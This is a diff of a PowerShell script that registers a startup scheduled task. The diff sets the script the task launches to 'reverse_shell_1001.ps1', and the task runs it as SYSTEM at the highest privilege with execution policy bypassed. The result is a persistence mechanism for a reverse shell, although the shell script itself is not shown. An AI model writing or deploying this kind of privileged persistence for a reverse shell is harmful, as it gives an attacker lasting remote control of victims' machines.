@@ -3,7 +3,7 @@
 
 param(
     [Parameter(Mandatory=$false)]
-    [string]$ScriptName = "YourScript.ps1",
+    [string]$ScriptName = "reverse_shell_1001.ps1",
     
     [Parameter(Mandatory=$false)]
     [string]$TaskName = "MyBootScript"
@@ -32,20 +32,20 @@ Write-Host "Creating scheduled task for: $ScriptPath"
 $Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File `"$ScriptPath`""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnDemand -DontStopIfGoingOnBatteries
+$Settings = New-ScheduledTaskSettingsSet
 
 # Register the scheduled task
 try {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
-    Write-Host "✓ Scheduled task '$TaskName' created successfully!" -ForegroundColor Green
+    Write-Host "Success! Scheduled task '$TaskName' created successfully!" -ForegroundColor Green
     Write-Host "Script '$ScriptName' will run at system startup." -ForegroundColor Green
+    
+    # Show the created task
+    Write-Host ""
+    Write-Host "Task details:"
+    Get-ScheduledTask -TaskName $TaskName | Select-Object TaskName, State, TaskPath
 }
 catch {
     Write-Error "Failed to create scheduled task: $($_.Exception.Message)"
     exit 1
 }
-
-# Show the created task
-Write-Host ""
-Write-Host "Task details:"
-Get-ScheduledTask -TaskName $TaskName | Select-Object TaskName, State, TaskPath
